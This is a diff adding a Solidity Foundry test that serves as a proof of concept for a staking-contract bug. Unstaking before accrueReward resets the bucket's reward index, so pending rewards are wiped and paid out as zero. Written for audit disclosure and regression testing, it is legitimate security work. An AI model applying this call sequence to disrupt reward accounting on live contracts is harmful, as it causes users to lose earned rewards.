@@ -344,4 +344,24 @@ contract TokenRewardInfos is SuperDCAStakingTest {
         assertEq(stakedAmount, 42);
         assertEq(lastIndex, staking.rewardIndex());
     }
+
+    function test_PoC_UnstakeBeforeAccrue_WipesBucketDelta() public {
+        // Set up a single bucket stake
+        vm.prank(user);
+        staking.stake(tokenA, 100e18);
+        // Let rewards accrue
+        uint256 start = staking.lastMinted();
+        uint256 secs = 100;
+        vm.warp(start + secs);
+        //what should be paid
+        uint256 expectedMint = secs * rate;
+        assertGt(expectedMint, 0, "sanity");
+        // Unstake before accrue resets bucket lastRewardIndex and wipes delta
+        vm.prank(user);
+        staking.unstake(tokenA, 1);
+        // Accrue now => pays 0 due to wiped delta
+        vm.prank(gauge);
+        uint256 paid = staking.accrueReward(tokenA);
+        assertEq(paid, 0, "pending bucket rewards wiped by unstake reset");
+    }
 }
